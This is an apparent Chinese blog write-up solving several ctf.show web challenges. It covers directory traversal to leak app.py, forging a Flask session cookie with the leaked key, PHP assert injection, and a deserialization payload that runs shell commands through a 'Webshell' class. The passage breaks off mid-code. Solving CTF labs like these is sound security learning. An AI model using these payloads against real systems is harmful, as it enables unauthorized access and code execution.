-<p><img src="https://img-blog.csdnimg.cn/b2f80d87ab79442899aa7c1789dabc7c.png" alt="2"><br>访问<strong><a target="_blank" rel="noopener" href="http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1">http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1</a></strong>时发现挨<strong>app.py</strong>存在<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45007073/article/details/113466902#:~:text=%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%201%20%E5%9C%A8URL%E5%86%85%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%202%20%E6%A3%80%E6%9F%A5%E4%BD%BF%E7%94%A8%E8%80%85%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E5%90%A6%E6%9C%89%E2%80%9C%E2%80%A6%E2%80%9D%E7%9A%84%E7%9B%AE%E5%BD%95%E9%98%B6%E5%B1%82%E5%AD%97%E7%AC%A6%203,%E5%9C%A8php.ini%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AEopen_basedir%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%204%20%E4%BD%BF%E7%94%A8realpath%E5%87%BD%E6%95%B0%E6%9D%A5%E5%B1%95%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84%E2%80%9C.%2F%E2%80%9D%E3%80%81%20%E2%80%9C%E2%80%A6%2F%E2%80%9D%E7%AD%89%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%90%8D%E7%A7%B0%205%20%E4%BD%BF%E7%94%A8basename%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%94%E5%9B%9E%E4%B8%8D%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0">目录穿越</a>访问<code>http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=../../app.py</code>得到app.py文件</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span>
-<span class="token comment"># -*-coding:utf-8 -*-</span>
-
-<span class="token triple-quoted-string string">"""
-# File       : app.py
-# Time       ：2022/11/07 09:16
-# Author     ：g4_simon
-# version    ：python 3.9.7
-# Description：抽老婆，哇偶~
-"""</span>
-
-<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> random
-<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag
-
-<span class="token comment">#初始化全局变量</span>
-app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
-app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span>
-
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
-    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
-
-
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>
-    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi
-    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span>
-
-
-
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
-    filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>
-        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你想干什么？"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-
-
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你怎么知道这个路径的？不过还好我有身份验证"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-
-
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>看大佬的wp原来是flask的session认证题目，需要在生成一个cookie才能得到flag。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你怎么知道这个路径的？不过还好我有身份验证"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>看到这句找到一个路径</p>
-<p><img src="https://img-blog.csdnimg.cn/57f0cfe9178e4930ad0c0a8885f3a123.png" alt="1"><br>还有身份验证？看了代码就知道要session中的isadmin为真。里面签名要用到SECRET_KEY；于是我们将isadmin的值更改后，使用密钥SECRET_KEY重新加密生成一个session。<br><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">github开源脚本</a>，在kali中执行脚本<br><img src="https://img-blog.csdnimg.cn/7eea38bdf10a46e58e10b3f7980efa98.png" alt="2"><br>得到新的session，然后访问<code>http://9bae1f73-6d1c-4258-a734-cf6bed842746.challenge.ctf.show/secret_path_U_never_know</code><br>用hackbar更改cookie头，session改为新生成的。得到flag。</p>
-<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token comment">//将flag.php文件包含在当前脚本中</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"一言既出，驷马难追!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-<span class="token punctuation">&#125;</span> 
-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以看到，get传入num，先判断num值是否等于114514，是的话执行下面语句。<br><code>assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</code><br>此语句先将 GET 请求中的参数 num 转换为整数，然后判断是否等于 1919810。如果相等，则继续执行下面的代码；否则，输出错误信息并终止脚本的执行。<br><strong>那么我们可以提终止脚本的执行</strong>，也就是传入<code>?num=114514);//</code>由于在php中我们传入的<code>114514);//</code>只会辨别出前面的数字<strong>114514</strong>再执行<strong>assert</strong>此时语句提前闭合，也就是<code>assert(&quot;intval($_GET114514);//)==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</code>后面被注释掉了直接执行<code>echo $flag;</code>得到flag。<br><img src="https://img-blog.csdnimg.cn/da7eab8fd3c44e4bb95ac6cf0a9cf4f3.png" alt="1"></p>
-<blockquote>
-<p>php中其中两种比较符号:<br>&#x3D;&#x3D;：先将字符串类型转化成相同，再比较<br>&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较<br>字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较<br>var_dump(‘a’ &#x3D;&#x3D; 0);&#x2F;&#x2F;true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0<br>var_dump(‘123a’ &#x3D;&#x3D; 123);&#x2F;&#x2F;true，这里’123a’会被转换为123<br>var_dump(‘a123’ &#x3D;&#x3D; 123);&#x2F;&#x2F;false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。</p>
-</blockquote>
-<p>还可以使用运算法<code>/?num=114514%2B1805296</code>加号被url编码**%2B**也可得到flag。</p>
-<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"一言既出，驷马难追!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span> 
-<span class="token punctuation">&#125;</span> 
-
-<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<blockquote>
-<p>其中，check() 函数的作用是检查输入的字符串中是否包含字母、分号、括号等特殊字符。如果没有包含这些字符，则返回 true，否则返回 false。</p>
-</blockquote>
-<p>先说一种解法，和上一题法二一样</p>
-<blockquote>
-<p>可以使用运算法<code>/?num=114514%2B1805296</code>加号被url编码**%2B**也可得到flag。</p>
-</blockquote>
-<h3 id="chatgpt对代码的分析"><a href="#chatgpt对代码的分析" class="headerlink" title="chatgpt对代码的分析"></a>chatgpt对代码的分析</h3><blockquote>
-<p>该代码的作用是接受一个名为 “num” 的 GET 请求参数，如果参数值等于 114514 并且经过 check()<br>函数检查没有包含字母、分号、括号等特殊字符，则会输出 $flag 变量的值。</p>
-<p>其中，check() 函数的作用是检查输入的字符串中是否包含字母、分号、括号等特殊字符。如果没有包含这些字符，则返回 true，否则返回<br>false。</p>
-<p>不过在第 6 行代码中，使用了 assert() 函数来判断 $_GET[‘num’] 是否等于<br>1919810，如果不等于就会输出一段提示信息并终止程序运行。注意到 assert()<br>函数是一个非常危险的函数，因为它会将字符串参数当作代码执行，因此如果在输入 $_GET[‘num’]<br>的时候传入了一些特殊字符，就可能导致代码执行漏洞。</p>
-<p>由于代码中包含了 flag.php 文件，因此我们无法得知 $flag 变量的值。不过可以尝试构造符合条件的 $_GET[‘num’]<br>参数，使得程序输出 $flag 变量的值。注意到 check()<br>函数中只检查了字母、分号、括号等特殊字符，因此可以使用数字、加号、减号等常规字符来构造参数。</p>
-</blockquote>
-<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><blockquote>
-<p>网页游戏类的题目直接查看其源代码。</p>
-</blockquote>
-<p>在js文件里看到有base64加密的内容。解码看看。<br><img src="https://img-blog.csdnimg.cn/5c5b3b1d2ec643d0a963c33a2fa414c7.png" alt="2"></p>
-<blockquote>
-<p>Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
-</blockquote>
-<p>直接访问得到flag。</p>
-<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><strong>考点：反序列化</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
-    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-
-        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-
-        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$unserializecmd</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>代码的意思是定义了一个webshell类，里面包含一个公共属性（<strong>cmd</strong>）和三个公共方法（**_construct()，init()，exec()<strong>）其中init()方法在构造函数_construct()中被调用，目的是用来检查cmd值中是否含有参数</strong>flag<strong>如果含有，则输出</strong>Hello World!<strong>，反之，则调用exec()方法来执行</strong>$cmd**。<br><img src="https://img-blog.csdnimg.cn/b09519fa51e74250a34f9e317b3884ce.png" alt="1"><br>具体来说，可以执行如下的代码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$W</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$W</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p> 得到<strong>O:8:”Webshell”:1:{s:3:”cmd”;s:2:”ls”;}</strong></p>
-<blockquote>
-<p>这个字符串表示一个包含一个名为 cmd 的属性的 Webshell 类对象。s:3:”cmd” 表示属性名字的长度为 3，s:2:”ls” 表示 $cmd 属性的值为 “ls”，它的长度为 2。通过将这个字符串传递给 unserialize() 函数，我们可以将其反序列化为一个 Webshell 对象，并执行其中包含的命令。</p>
-</blockquote>
-<p>url：<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4cc0a2e1e93546adba733d88ea1641e3.png" alt="3"><br>url：<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;tac fl*&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4df37ceb5f164c95b99945642caeb496.png" alt="2"></p>
-<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
-
-<span class="token variable">$result</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-
-<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你太长了！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span><span class="token string double-quoted-string">"大牛"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>count()用来统计get传入参数的个数，如果传入**?a&#x3D;1<strong>，那就是一个参数，传入</strong>?a&#x3D;1&amp;b&#x3D;2<strong>，那就是两个参数。<br>strlen()用来返回字符串的长度，如果大于1，那就执行die，否则将传入的get参数拼接到result中。<br>然后如果result&#x3D;&#x3D;&#x3D;大牛，那就输出flag。<br><strong>在这里我们需要知道</strong><br><code>大牛</code>在url编码后是<code>%E5%A4%A7%E7%89%9B</code>一个%E5占用一个字节，所以我们可以通过将</strong>大牛<strong>进行url编码然后</strong>for函数**进行拼接得到flag。一个汉字有3位url编码，然后用1-6</p>
-<p>payload<code>http://da499d91-835d-4543-9c2e-faa0b2ea3723.challenge.ctf.show?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>之后得到flag。</p>
-<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
